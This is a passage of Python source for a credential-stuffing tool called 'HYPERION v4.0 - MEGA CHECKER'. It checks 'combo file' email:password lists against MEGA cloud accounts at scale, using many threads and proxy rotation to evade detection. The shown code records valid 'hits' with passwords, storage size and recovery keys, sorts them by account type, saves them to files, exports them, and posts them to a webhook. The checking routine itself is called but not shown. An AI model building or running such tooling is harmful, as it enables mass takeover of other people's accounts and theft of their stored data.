                    # For now, just log that keyword search is active
                    hit_message += f" | Keyword: {self.settings['keyword_search']}"
                
                self.log_terminal(hit_message, "success")
                
                # Send webhook notification for hits
                if self.settings.get('webhook_url'):
                    webhook_message = f"🎯 **NEW HIT FOUND!**\\n\\n" \
                                    f"📧 **Account:** {result.email}\\n" \
                                    f"🏷️ **Type:** {category}\\n" \
                                    f"💾 **Storage:** {storage}\\n" \
                                    f"📊 **Total Hits:** {self.stats['hits']}"
                    
                    if self.settings.get('keyword_search'):
                        webhook_message += f"\\n🔍 **Keyword:** {self.settings['keyword_search']}"
                    
                    self.send_webhook_notification(webhook_message, 0x00ff00)
                
            elif result.status == 'fail':
                self.stats['fails'] += 1
            else:
                self.stats['errors'] += 1
        
        # Calculate rate
        if self.stats['start_time']:
            elapsed = time.time() - self.stats['start_time']
            self.stats['rate'] = self.stats['checked'] / elapsed * 60 if elapsed > 0 else 0
        
        self.update_stats()
        
        # Update modern UI elements
        self.update_modern_stats()
        self.update_progress_bar()
        
        # Periodic performance optimization
        if self.stats['checked'] % 100 == 0:  # Every 100 checks
            self.performance_optimizer.optimize_memory()
            
            # Check if we need to adjust performance settings
            memory_info = self.performance_optimizer.get_memory_info()
            if memory_info['ram_percent'] > 85:
                self.log_terminal(f"⚠️ High memory usage ({memory_info['ram_percent']:.0f}%), optimizing...", "warning")
                gc.collect()  # Force garbage collection
        
        # Update status
        progress = (self.stats['checked'] / total) * 100
        self.status_label.configure(text=f"SCANNING {progress:.1f}%")
        
        # Check if complete (prevent multiple completions)
        if self.stats['checked'] >= total and not hasattr(self, '_scan_completed'):
            self._scan_completed = True
            self.on_scan_complete()
    
    def on_scan_complete(self):
        """Handle scan completion with automatic storage"""
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.status_label.configure(text="COMPLETE", text_color=HackerTheme.SUCCESS)
        
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        avg_rate = self.stats['checked'] / elapsed * 60 if elapsed > 0 else 0
        
        self.log_terminal("=" * 60, "success")
        self.log_terminal("🎯 SCAN COMPLETE", "success")
        self.log_terminal(f"📊 Results: {self.stats['hits']} hits / {self.stats['checked']} checked", "success")
        self.log_terminal(f"⏱️ Time: {elapsed:.1f}s | Rate: {avg_rate:.1f}/min", "info")
        
        # Performance summary
        memory_info = self.performance_optimizer.get_memory_info()
        self.log_terminal(f"🚀 Performance Summary:", "info")
        self.log_terminal(f"   💻 CPU Cores Used: {self.performance_optimizer.cpu_cores}", "info")
        self.log_terminal(f"   🧠 Peak RAM Usage: {memory_info['process_memory']:.1f}GB", "info")
        self.log_terminal(f"   🪶 Mode: Lightweight (no external dependencies)", "info")
        self.log_terminal(f"   ⚡ Final Rate: {avg_rate:.1f} checks/min", "info")
        
        # ===== AUTOMATIC STORAGE =====
        if self.stats['hits'] > 0:
            self.log_terminal("💾 AUTO-STORING results...", "info")
            stored_files = self.auto_store_results()
            
            self.log_terminal(f"✅ AUTO-STORAGE COMPLETE:", "success")
            for file_info in stored_files:
                self.log_terminal(f"   📁 {file_info}", "info")
        else:
            self.log_terminal("ℹ️ No hits to store", "info")
        
        self.log_terminal("=" * 60, "success")
        
        if self.stats['hits'] > 0:
            messagebox.showinfo(
                "Scan Complete - Auto-Stored!",
                f"Scan finished and results automatically stored!\n\n"
                f"Hits: {self.stats['hits']}\n"
                f"Checked: {self.stats['checked']}\n"
                f"Time: {elapsed:.1f} seconds\n\n"
                f"Files saved in: hits/{datetime.now().strftime('%Y-%m-%d')}/"
            )
        else:
            messagebox.showinfo(
                "Scan Complete",
                f"Scan finished!\n\n"
                f"Hits: {self.stats['hits']}\n"
                f"Checked: {self.stats['checked']}\n"
                f"Time: {elapsed:.1f} seconds"
            )
    
    def auto_store_results(self):
        """Automatically store all results in organized folders"""
        stored_files = []
        
        try:
            # Ensure hits directory exists
            self.create_hits_directory_structure()
            
            timestamp = datetime.now().strftime("%H-%M-%S")
            date_str = datetime.now().strftime("%Y-%m-%d")
            
            # Master hits file with all results
            master_file = f"hits/{date_str}/MASTER_HITS_{timestamp}.txt"
            with open(master_file, 'w', encoding='utf-8') as f:
                f.write(f"HYPERION v4.0 - MEGA CHECKER RESULTS\\n")
                f.write(f"Scan completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n")
                f.write(f"Total hits: {len(self.hits)}\\n")
                f.write("=" * 60 + "\\n\\n")
                
                for hit in self.hits:
                    f.write(f"{hit}\\n")
            
            stored_files.append(f"Master file: {Path(master_file).name}")
            
            # Categorized files
            for category, hits_list in self.hits_categories.items():
                if hits_list:
                    category_file = f"hits/{date_str}/{category}/{category}_{timestamp}.txt"
                    os.makedirs(os.path.dirname(category_file), exist_ok=True)
                    
                    with open(category_file, 'w', encoding='utf-8') as f:
                        f.write(f"HYPERION v4.0 - {category} ACCOUNTS\\n")
                        f.write(f"Count: {len(hits_list)}\\n")
                        f.write("=" * 40 + "\\n\\n")
                        
                        for hit in hits_list:
                            f.write(f"{hit}\\n")
                    
                    stored_files.append(f"{category}: {len(hits_list)} accounts")
            
            # Detailed captures if available
            if self.hits_detailed:
                detailed_file = f"hits/{date_str}/DETAILED_CAPTURES/detailed_{timestamp}.json"
                os.makedirs(os.path.dirname(detailed_file), exist_ok=True)
                
                with open(detailed_file, 'w', encoding='utf-8') as f:
                    json.dump([
                        {
                            'email': hit.email,
                            'password': hit.password,
                            'status': hit.status,
                            'file_count': hit.file_count,
                            'folder_count': hit.folder_count,
                            'storage_bytes': hit.storage_bytes,
                            'recovery_key': hit.recovery_key,
                            'capture_date': hit.capture_date,
                            'capture_time': hit.capture_time
                        } for hit in self.hits_detailed
                    ], f, indent=2)
                
                stored_files.append(f"Detailed: {len(self.hits_detailed)} with full info")
            
            return stored_files
            
        except Exception as e:
            self.log_terminal(f"❌ Auto-storage error: {e}", "error")
            return [f"Error: {str(e)}"]
    
    def single_check_enhanced(self):
        """Enhanced single account checking with automatic storage"""
        email = self.single_email.get().strip()
        password = self.single_password.get().strip()
        
        if not email or not password:
            messagebox.showerror("Error", "Please enter both email and password!")
            return
        
        # Clear previous results
        self.single_results.configure(state="normal")
        self.single_results.delete("1.0", "end")
        self.single_results.configure(state="disabled")
        
        def check_thread():
            try:
                self.single_results.configure(state="normal")
                self.single_results.insert("end", f"🔍 Checking: {email}\\n")
                self.single_results.configure(state="disabled")
                
                # Use existing checker
                checker = MEGAChecker()
                result = checker.check_account(email, password)
                
                self.single_results.configure(state="normal")
                
                if result.status == "hit":
                    self.single_results.insert("end", f"✅ SUCCESS: Valid account!\\n")
                    self.single_results.insert("end", f"📧 Email: {result.email}\\n")
                    self.single_results.insert("end", f"🔑 Password: {result.password}\\n")
                    
                    if result.file_count is not None:
                        self.single_results.insert("end", f"📁 Files: {result.file_count}\\n")
                    if result.folder_count is not None:
                        self.single_results.insert("end", f"📂 Folders: {result.folder_count}\\n")
                    if result.storage_bytes is not None:
                        storage_mb = result.storage_bytes / (1024 * 1024)
                        self.single_results.insert("end", f"💾 Storage: {storage_mb:.1f} MB\\n")
                    if result.recovery_key:
                        self.single_results.insert("end", f"🔐 Recovery: {result.recovery_key}\\n")
                    
                    # Auto-store single result
                    self.store_detailed_hit(result)
                    self.single_results.insert("end", f"\\n💾 Result automatically saved to hits folder\\n")
                    
                else:
                    self.single_results.insert("end", f"❌ FAILED: Invalid credentials\\n")
                    self.single_results.insert("end", f"📧 Email: {email}\\n")
                    self.single_results.insert("end", f"🔑 Password: {password}\\n")
                
                self.single_results.configure(state="disabled")
                
            except Exception as e:
                self.single_results.configure(state="normal")
                self.single_results.insert("end", f"❌ ERROR: {str(e)}\\n")
                self.single_results.configure(state="disabled")
        
        # Run in thread to prevent UI freeze
        import threading
        threading.Thread(target=check_thread, daemon=True).start()
    
    def update_threads_display(self, value):
        """Update threads display when slider changes"""
        self.threads_display.configure(text=str(int(value)))
    
    def update_memory_display(self, value):
        """Update memory display when slider changes"""
        self.memory_display.configure(text=f"{int(value)}%")
    
    def show_single_check_dialog(self):
        """Show modern single account check dialog"""
        dialog = ctk.CTkToplevel(self)
        dialog.title("Single Account Checker")
        dialog.geometry("500x400")
        dialog.transient(self)
        dialog.grab_set()
        
        # Configure dialog
        dialog.configure(fg_color=HackerTheme.BG_MAIN)
        
        # Header
        header = ctk.CTkLabel(
            dialog,
            text="🔍 SINGLE ACCOUNT CHECKER",
            font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        header.pack(pady=20)
        
        # Input frame
        input_frame = ctk.CTkFrame(dialog, fg_color=HackerTheme.BG_SECONDARY, corner_radius=10)
        input_frame.pack(fill="x", padx=20, pady=10)
        
        # Email input
        email_label = ctk.CTkLabel(input_frame, text="Email:", font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"))
        email_label.pack(anchor="w", padx=15, pady=(15, 5))
        
        email_entry = ctk.CTkEntry(
            input_frame,
            font=ctk.CTkFont(family="Segoe UI", size=12),
            height=35,
            corner_radius=6,
            placeholder_text="Enter email address"
        )
        email_entry.pack(fill="x", padx=15, pady=(0, 10))
        
        # Password input
        password_label = ctk.CTkLabel(input_frame, text="Password:", font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"))
        password_label.pack(anchor="w", padx=15, pady=(10, 5))
        
        password_entry = ctk.CTkEntry(
            input_frame,
            font=ctk.CTkFont(family="Segoe UI", size=12),
            height=35,
            corner_radius=6,
            show="*",
            placeholder_text="Enter password"
        )
        password_entry.pack(fill="x", padx=15, pady=(0, 15))
        
        # Check button
        check_btn = ctk.CTkButton(
            dialog,
            text="🚀 CHECK ACCOUNT",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"),
            fg_color=HackerTheme.SUCCESS,
            hover_color="#00aa00",
            corner_radius=8,
            height=40,
            command=lambda: self.perform_single_check(email_entry.get(), password_entry.get(), results_text)
        )
        check_btn.pack(pady=20)
        
        # Results
        results_frame = ctk.CTkFrame(dialog, fg_color=HackerTheme.BG_SECONDARY, corner_radius=10)
        results_frame.pack(fill="both", expand=True, padx=20, pady=(0, 20))
        
        results_label = ctk.CTkLabel(results_frame, text="Results:", font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"))
        results_label.pack(anchor="w", padx=15, pady=(15, 5))
        
        results_text = ctk.CTkTextbox(
            results_frame,
            font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=HackerTheme.BG_MAIN,
            corner_radius=6
        )
        results_text.pack(fill="both", expand=True, padx=15, pady=(0, 15))
        results_text.configure(state="disabled")
    
    def perform_single_check(self, email, password, results_widget):
        """Perform single account check with modern feedback"""
        if not email or not password:
            messagebox.showerror("Error", "Please enter both email and password!")
            return
        
        def check_thread():
            try:
                results_widget.configure(state="normal")
                results_widget.delete("1.0", "end")
                results_widget.insert("end", f"🔍 Checking: {email}\n")
                results_widget.configure(state="disabled")
                
                # Use existing checker
                checker = MEGAChecker()
                result = checker.check_account(email, password)
                
                results_widget.configure(state="normal")
                
                if result.status == "hit":
                    results_widget.insert("end", f"\n✅ SUCCESS: Valid MEGA account!\n")
                    results_widget.insert("end", f"📧 Email: {result.email}\n")
                    results_widget.insert("end", f"🔑 Password: {result.password}\n")
                    
                    if result.file_count is not None:
                        results_widget.insert("end", f"📁 Files: {result.file_count:,}\n")
                    if result.folder_count is not None:
                        results_widget.insert("end", f"📂 Folders: {result.folder_count:,}\n")
                    if result.storage_bytes is not None:
                        storage_mb = result.storage_bytes / (1024 * 1024)
                        results_widget.insert("end", f"💾 Storage: {storage_mb:.1f} MB\n")
                    if result.recovery_key:
                        results_widget.insert("end", f"🔐 Recovery: {result.recovery_key}\n")
                    
                    # Auto-store
                    self.store_detailed_hit(result)
                    results_widget.insert("end", f"\n💾 Result automatically saved!\n")
                    
                else:
                    results_widget.insert("end", f"\n❌ FAILED: Invalid credentials\n")
                    results_widget.insert("end", f"📧 Email: {email}\n")
                    results_widget.insert("end", f"🔑 Password: {password}\n")
                
                results_widget.configure(state="disabled")
                
            except Exception as e:
                results_widget.configure(state="normal")
                results_widget.insert("end", f"\n❌ ERROR: {str(e)}\n")
                results_widget.configure(state="disabled")
        
        import threading
        threading.Thread(target=check_thread, daemon=True).start()
    
    def update_modern_stats(self):
        """Update modern statistics display with performance monitoring"""
        if hasattr(self, 'stat_widgets'):
            # Update stat cards
            self.stat_widgets['total'].configure(text=f"{self.stats['total']:,}")
            self.stat_widgets['checked'].configure(text=f"{self.stats['checked']:,}")
            
            # Color-coded hits
            hits = self.stats['hits']
            self.stat_widgets['hits'].configure(
                text=f"{hits:,}",
                text_color=HackerTheme.SUCCESS if hits > 0 else HackerTheme.TEXT_PRIMARY
            )
            
            # Calculate and display rate
            if self.stats['start_time']:
                elapsed = time.time() - self.stats['start_time']
                rate = (self.stats['checked'] / elapsed * 60) if elapsed > 0 else 0
                self.stat_widgets['rate'].configure(text=f"{rate:.0f}")
            
            # Update performance stats
            self.update_performance_stats()
    
    def update_performance_stats(self):
        """Update performance monitoring stats"""
        if hasattr(self, 'stat_widgets') and hasattr(self, 'performance_optimizer'):
            try:
                # Get memory info
                memory_info = self.performance_optimizer.get_memory_info()
                
                # Update memory usage
                if 'memory' in self.stat_widgets:
                    memory_percent = memory_info['ram_percent']
                    self.stat_widgets['memory'].configure(
                        text=f"{memory_percent:.0f}%",
                        text_color=HackerTheme.ERROR if memory_percent > 85 else 
                                  HackerTheme.WARNING if memory_percent > 70 else HackerTheme.SUCCESS
                    )
                
                # Update CPU usage (lightweight estimation)
                if 'cpu' in self.stat_widgets:
                    # Simple CPU load estimation based on active threads
                    active_threads = threading.active_count()
                    cpu_estimate = min((active_threads / self.performance_optimizer.cpu_cores) * 100, 100)
                    self.stat_widgets['cpu'].configure(
                        text=f"{cpu_estimate:.0f}%",
                        text_color=HackerTheme.ERROR if cpu_estimate > 90 else 
                                  HackerTheme.WARNING if cpu_estimate > 70 else HackerTheme.SUCCESS
                    )
                
                # Update lightweight mode status
                if 'gpu' in self.stat_widgets:
                    # Show lightweight mode instead of GPU status
                    status = "LIGHT"
                    color = HackerTheme.SUCCESS
                    self.stat_widgets['gpu'].configure(text=status, text_color=color)
                
                # Update threads count
                if 'threads' in self.stat_widgets:
                    current_threads = int(self.threads_slider.get()) if hasattr(self, 'threads_slider') else self.performance_optimizer.optimal_threads
                    self.stat_widgets['threads'].configure(text=str(current_threads))
                
                # Periodic memory optimization
                if memory_info['ram_percent'] > 80:
                    self.performance_optimizer.optimize_memory()
                    
            except Exception as e:
                logger.warning(f"Performance stats update failed: {e}")
    
    def update_progress_bar(self):
        """Update modern progress bar"""
        if hasattr(self, 'progress_bar') and self.stats['total'] > 0:
            progress = self.stats['checked'] / self.stats['total']
            self.progress_bar.set(progress)
            
            # Update progress text
            percent = progress * 100
            self.progress_text.configure(
                text=f"{self.stats['checked']:,} / {self.stats['total']:,} ({percent:.1f}%)"
            )
    
    def update_status_indicator(self, status, color):
        """Update modern status indicator"""
        if hasattr(self, 'status_indicator'):
            self.status_indicator.configure(text_color=color)
        if hasattr(self, 'status_label'):
            self.status_label.configure(text=status, text_color=color)
    
    def export_results(self):
        """Export scan results"""
        if not self.checker or not self.checker.results:
            messagebox.showwarning("No Results", "No results to export")
            return
        
        # Get export path
        file_path = filedialog.asksaveasfilename(
            title="Export Results",
            defaultextension=".txt",
            filetypes=[
                ("Text files", "*.txt"),
                ("JSON files", "*.json"),
                ("CSV files", "*.csv")
            ]
        )
        
        if not file_path:
            return
        
        try:
            hits = [r for r in self.checker.results if r.status == 'hit']
            
            if file_path.endswith('.json'):
                # JSON export
                export_data = {
                    'scan_info': {
                        'timestamp': datetime.now().isoformat(),
                        'total_checked': len(self.checker.results),
                        'hits': len(hits),
                        'hit_rate': f"{len(hits)/len(self.checker.results)*100:.2f}%"
                    },
                    'hits': [
                        {
                            'email': r.email,
                            'password': r.password,
                            'account_type': r.account_type,
                            'storage_used': r.storage_used,
                            'storage_total': r.storage_total,
                            'timestamp': r.timestamp
                        }
                        for r in hits
                    ]
                }
                
                with open(file_path, 'w', encoding='utf-8') as f:
                    json.dump(export_data, f, indent=2)
            
            elif file_path.endswith('.csv'):
                # CSV export
                import csv
                with open(file_path, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(['Email', 'Password', 'Account Type', 'Storage Used', 'Storage Total', 'Timestamp'])
                    for r in hits:
                        writer.writerow([r.email, r.password, r.account_type, r.storage_used, r.storage_total, r.timestamp])
            
            else:
                # Text export (default)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("HYPERION v4.0 - Scan Results\n")
                    f.write("=" * 50 + "\n")
                    f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Total Checked: {len(self.checker.results)}\n")
                    f.write(f"Hits Found: {len(hits)}\n")
                    f.write(f"Hit Rate: {len(hits)/len(self.checker.results)*100:.2f}%\n")
                    f.write("=" * 50 + "\n\n")
                    
                    for r in hits:
                        f.write(f"{r.email}:{r.password}\n")
                        if r.account_type != "Unknown":
                            f.write(f"  Type: {r.account_type}\n")
                            f.write(f"  Storage: {r.storage_used} / {r.storage_total}\n")
                        f.write(f"  Checked: {r.timestamp}\n\n")
            
            self.log_terminal(f"💾 Results exported: {Path(file_path).name}", "success")
            self.log_terminal(f"📈 Exported {len(hits)} hits", "success")
            
            messagebox.showinfo("Export Complete", f"Results exported successfully!\n\nFile: {Path(file_path).name}\nHits: {len(hits)}")
            
        except Exception as e:
            self.log_terminal(f"❌ Export failed: {e}", "error")
            messagebox.showerror("Export Failed", f"Failed to export results:\n{e}")
    
    def create_quick_actions(self, parent, ui_font, terminal_font):
        """Create quick actions panel with turbo features"""
        
        header = ctk.CTkLabel(
            parent,
            text="🚀 QUICK ACTIONS",
            font=ctk.CTkFont(family="Consolas", size=16, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        header.pack(pady=(15, 10))
        
        # Action buttons frame
        actions_frame = ctk.CTkFrame(parent, fg_color="transparent")
        actions_frame.pack(fill="both", expand=True, padx=15, pady=(0, 15))
        
        # Main action buttons - large for quick access
        main_row = ctk.CTkFrame(actions_frame, fg_color="transparent")
        main_row.pack(fill="x", pady=(0, 10))
        
        self.start_btn = ctk.CTkButton(
            main_row,
            text="🚀 START TURBO",
            font=ctk.CTkFont(family="Consolas", size=14, weight="bold"),
            fg_color=HackerTheme.SUCCESS,
            hover_color="#00cc33",
            text_color="white",
            height=50,
            command=self.start_turbo_checking
        )
        self.start_btn.pack(side="left", fill="x", expand=True, padx=(0, 5))
        
        self.stop_btn = ctk.CTkButton(
            main_row,
            text="🛑 STOP",
            font=ctk.CTkFont(family="Consolas", size=14, weight="bold"),
            fg_color=HackerTheme.ERROR,
            hover_color="#cc0033",
            text_color="white",
            height=50,
            state="disabled",
            command=self.stop_checking
        )
        self.stop_btn.pack(side="left", fill="x", expand=True, padx=(5, 0))
        
        # Secondary actions
        second_row = ctk.CTkFrame(actions_frame, fg_color="transparent")
        second_row.pack(fill="x")
        
        single_btn = ctk.CTkButton(
            second_row,
            text="🔍 SINGLE CHECK",
            font=ui_font,
            fg_color="#cccc00",
            hover_color="#999900",
            text_color=HackerTheme.BG_MAIN,
            height=35,
            command=self.single_account_check
        )
        single_btn.pack(side="left", fill="x", expand=True, padx=(0, 5))
        
        export_btn = ctk.CTkButton(
            second_row,
            text="💾 EXPORT",
            font=ui_font,
            fg_color=HackerTheme.ACCENT,
            hover_color="#cc0066",
            text_color="white",
            height=35,
            command=self.export_results
        )
        export_btn.pack(side="left", fill="x", expand=True, padx=(5, 0))
        
        # Third row - Tools and Settings
        third_row = ctk.CTkFrame(actions_frame, fg_color="transparent")
        third_row.pack(fill="x", pady=(5, 0))
        
        tools_btn = ctk.CTkButton(
            third_row,
            text="🛠️ TOOLS",
            font=ui_font,
            fg_color="#ff6600",
            hover_color="#cc5200",
            text_color="white",
            height=30,
            command=self.open_tools_menu
        )
        tools_btn.pack(side="left", fill="x", expand=True, padx=(0, 2))
        
        settings_btn = ctk.CTkButton(
            third_row,
            text="⚙️ CONFIG",
            font=ui_font,
            fg_color="#cc00ff",
            hover_color="#9900cc",
            text_color="white",
            height=30,
            command=self.open_settings_menu
        )
        settings_btn.pack(side="left", fill="x", expand=True, padx=(2, 2))
        
        clear_btn = ctk.CTkButton(
            third_row,
            text="🧹 CLEAR",
            font=ui_font,
            fg_color=HackerTheme.ERROR,
            hover_color="#990000",
            text_color="white",
            height=30,
            command=self.clear_terminal
        )
        clear_btn.pack(side="left", fill="x", expand=True, padx=(2, 0))
        
        # Fourth row - Full Details and Advanced Options
        fourth_row = ctk.CTkFrame(actions_frame, fg_color="transparent")
        fourth_row.pack(fill="x", pady=(5, 0))
        
        details_btn = ctk.CTkButton(
            fourth_row,
            text="📋 FULL DETAILS",
            font=ui_font,
            fg_color="#0066cc",
            hover_color="#004499",
            text_color="white",
            height=30,
            command=self.show_full_details
        )
        details_btn.pack(side="left", fill="x", expand=True, padx=(0, 2))
        
        live_hits_btn = ctk.CTkButton(
            fourth_row,
            text="👁️ LIVE HITS",
            font=ui_font,
            fg_color="#009900",
            hover_color="#006600",
            text_color="white",
            height=30,
            command=self.show_live_hits_viewer
        )
        live_hits_btn.pack(side="left", fill="x", expand=True, padx=(2, 0))
    
    def create_live_terminal(self, parent, terminal_font):
        """Create optimized live terminal"""
        
        header = ctk.CTkLabel(
            parent,
            text="💻 LIVE TERMINAL",
            font=ctk.CTkFont(family="Consolas", size=16, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        header.pack(pady=(15, 10))
        
        # High-performance terminal
        self.terminal = ctk.CTkTextbox(
            parent,
            font=terminal_font,
            fg_color=HackerTheme.BG_TERMINAL,
            text_color=HackerTheme.TEXT_PRIMARY,
            border_width=1,
            border_color=HackerTheme.BORDER_GLOW,
            wrap="none"  # Better performance
        )
        self.terminal.pack(fill="both", expand=True, padx=15, pady=(0, 15))
        
        # Initialize with turbo message
        self.log_terminal("HYPERION v4.0 TURBO EDITION READY", "success")
        self.log_terminal(">> High-speed checking system initialized", "info")
        self.log_terminal(">> Enhanced proxy rotation enabled", "info")
        self.log_terminal(">> Load combo file to begin...", "info")
    
    def create_stats_dashboard(self, parent, ui_font, terminal_font):
        """Create real-time stats dashboard"""
        
        header = ctk.CTkLabel(
            parent,
            text="📊 LIVE STATS",
            font=ctk.CTkFont(family="Consolas", size=16, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        header.pack(pady=(15, 10))
        
        # Stats grid container
        stats_container = ctk.CTkFrame(parent, fg_color="transparent")
        stats_container.pack(fill="both", expand=True, padx=15, pady=(0, 15))
        
        # Configure responsive grid
        for i in range(3):
            stats_container.grid_rowconfigure(i, weight=1)
        for j in range(2):
            stats_container.grid_columnconfigure(j, weight=1)
        
        # Create enhanced stat boxes
        self.stat_widgets = {}
        stats_data = [
            ("Total", "0", HackerTheme.TEXT_SECONDARY, 0, 0),
            ("Checked", "0", HackerTheme.PRIMARY, 0, 1),
            ("Hits", "0", HackerTheme.SUCCESS, 1, 0),
            ("Fails", "0", HackerTheme.ERROR, 1, 1),
            ("Speed", "0/min", HackerTheme.ACCENT, 2, 0),
            ("Proxies", "0", "#00ccff", 2, 1)
        ]
        
        for label, value, color, row, col in stats_data:
            stat_frame = ctk.CTkFrame(
                stats_container,
                fg_color=HackerTheme.BG_ELEVATED,
                border_width=1,
                border_color=HackerTheme.BORDER_MAIN,
                height=60
            )
            stat_frame.grid(row=row, column=col, sticky="ew", padx=3, pady=3)
            stat_frame.grid_propagate(False)
            
            # Stat label
            ctk.CTkLabel(
                stat_frame,
                text=label,
                font=ctk.CTkFont(family="Segoe UI", size=11),
                text_color=HackerTheme.TEXT_SECONDARY
            ).pack(pady=(8, 0))
            
            # Stat value
            value_label = ctk.CTkLabel(
                stat_frame,
                text=value,
                font=ctk.CTkFont(family="Consolas", size=18, weight="bold"),
                text_color=color
            )
            value_label.pack(pady=(0, 8))
            
            self.stat_widgets[label.lower()] = value_label
            
        # Add hits categorization display
        hits_header = ctk.CTkLabel(
            parent,
            text="🎯 HITS BY TYPE",
            font=ctk.CTkFont(family="Consolas", size=14, weight="bold"),
            text_color=HackerTheme.ACCENT
        )
        hits_header.pack(pady=(15, 5))
        
        # Hits categories container
        self.hits_display_frame = ctk.CTkFrame(
            parent,
            fg_color=HackerTheme.BG_ELEVATED,
            border_width=1,
            border_color=HackerTheme.BORDER_MAIN
        )
        self.hits_display_frame.pack(fill="x", padx=15, pady=(0, 10))
        
        # Initialize hits display widgets
        self.hits_widgets = {}
        
        # Create category displays
        categories = ["PRO", "FREE_USED", "FREE_EMPTY", "UNKNOWN"]
        colors = [HackerTheme.SUCCESS, "#ffaa00", "#66ccff", HackerTheme.TEXT_SECONDARY]
        
        for i, (category, color) in enumerate(zip(categories, colors)):
            category_frame = ctk.CTkFrame(self.hits_display_frame, fg_color="transparent")
            category_frame.pack(fill="x", padx=5, pady=2)
            
            # Category label and count
            label_text = ctk.CTkLabel(
                category_frame,
                text=f"{category}:",
                font=ctk.CTkFont(family="Consolas", size=11),
                text_color=HackerTheme.TEXT_SECONDARY,
                width=80
            )
            label_text.pack(side="left", padx=(5, 0))
            
            count_label = ctk.CTkLabel(
                category_frame,
                text="0",
                font=ctk.CTkFont(family="Consolas", size=11, weight="bold"),
                text_color=color,
                width=40
            )
            count_label.pack(side="left", padx=(5, 0))
            
            # Progress bar for this category
            progress_bar = ctk.CTkProgressBar(
                category_frame,
                width=120,
                height=8,
                progress_color=color,
                fg_color=HackerTheme.BG_MAIN
            )
            progress_bar.pack(side="left", padx=(10, 5))
            progress_bar.set(0)
            
            self.hits_widgets[category.lower()] = {
                'count_label': count_label,
                'progress_bar': progress_bar
            }
    
    def start_turbo_checking(self):
        """Enhanced turbo checking with optimized performance"""
        if not self.combo_data:
            self.log_terminal("❌ No combo file loaded", "error")
            messagebox.showerror("Error", "Please load a combo file first!")
            return
            
        # Prevent multiple simultaneous checking sessions
        if hasattr(self, 'checking_thread') and self.checking_thread and self.checking_thread.is_alive():
            self.log_terminal("⚠️ Checking already in progress", "warning")
            return
        
        # Turbo settings
        threads = 25  # Increased thread count
        delay_range = (0.5, 1.0)  # Faster delays
        use_proxies = True
        
        # Update UI for turbo mode
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.status_label.configure(text="🚀 TURBO ACTIVE", text_color=HackerTheme.SUCCESS)
        
        # Apply resume position
        start_position = self.settings.get('resume_position', 0)
        if start_position > 0:
            self.combo_data = self.combo_data[start_position:]
            self.log_terminal(f"🔄 Resuming from position {start_position}", "info")
        
        # Update modern UI for start
        self.update_status_indicator("CHECKING ACTIVE", HackerTheme.SUCCESS)
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        
        # Force UI update to make stop button immediately clickable
        self.update()
        
        # Enhanced logging
        self.log_terminal(f"🚀 TURBO MODE: {len(self.combo_data):,} accounts", "success")
        self.log_terminal("✅ AUTO-SAVE: Results will be automatically stored", "info")
        
        # Get settings from modern UI with performance optimization
        base_threads = int(self.threads_slider.get())
        use_proxies = self.use_proxies.get()
        use_gpu = self.use_gpu.get() if hasattr(self, 'use_gpu') else False
        use_multiprocessing = self.use_multiprocessing.get() if hasattr(self, 'use_multiprocessing') else True
        
        # Optimize thread count for lightweight operation
        if use_multiprocessing and self.performance_optimizer.cpu_cores >= 4:
            threads = min(base_threads * 1.5, self.performance_optimizer.optimal_threads)
            self.log_terminal("⚡ Multi-core optimization enabled - increasing thread capacity", "success")
        else:
            threads = min(base_threads, self.performance_optimizer.optimal_threads)
        
        # Log performance settings
        self.log_terminal(f"⚙️ Settings: {threads} threads | Proxies: {'ON' if use_proxies else 'OFF'}", "info")
        self.log_terminal(f"🪶 Performance: Lightweight Mode | Multi-Core {'ON' if use_multiprocessing else 'OFF'}", "info")
        self.log_terminal(f"🧠 RAM: {self.performance_optimizer.ram_total:.1f}GB estimated, using up to {int(self.memory_slider.get()) if hasattr(self, 'memory_slider') else 70}%", "info")
        
        # Initialize progress
        self.stats['total'] = len(self.combo_data)
        self.update_progress_bar()
        
        # Send start webhook notification
        if self.settings.get('webhook_url'):
            start_message = f"🚀 **HYPERION TURBO STARTED**\\n\\n" \
                          f"📊 **Accounts to check:** {len(self.combo_data):,}\\n" \
                          f"⚡ **Threads:** {threads}\\n" \
                          f"🔄 **Resume from:** {start_position}\\n" \
                          f"🎯 **Target:** Find valid MEGA accounts"
            
            if self.settings.get('keyword_search'):
                start_message += f"\\n🔍 **Keyword:** {self.settings['keyword_search']}"
                
            self.send_webhook_notification(start_message, 0x0099ff)
        self.log_terminal(f"⚡ Threads: {threads} | Delay: {delay_range[0]}-{delay_range[1]}s", "info")
        self.log_terminal("🛡️ High-speed proxy rotation: ACTIVE", "info")
        
        # Initialize enhanced stats and reset completion flag
        self.stats = {
            'total': len(self.combo_data), 'checked': 0, 'hits': 0, 'fails': 0, 'errors': 0,
            'start_time': time.time(), 'rate': 0
        }
        self._scan_completed = False  # Reset completion flag
        self.update_modern_stats()
        
        # Configure lightweight performance settings
        perf_settings = {
            'lightweight_mode': True,
            'use_multiprocessing': use_multiprocessing,
            'optimal_threads': threads,
            'memory_limit': int(self.memory_slider.get()) if hasattr(self, 'memory_slider') else 70,
            'batch_size': self.performance_optimizer.chunk_size
        }
        
        # Start turbo checking with performance optimization
        self.checker = MEGAChecker(
            progress_callback=self.on_progress,
            performance_settings=perf_settings,
            log_callback=self.log_terminal
        )
        
        def run_turbo_checker():
            try:
                # Check if stop was requested before starting
                if hasattr(self, '_scan_completed') and self._scan_completed:
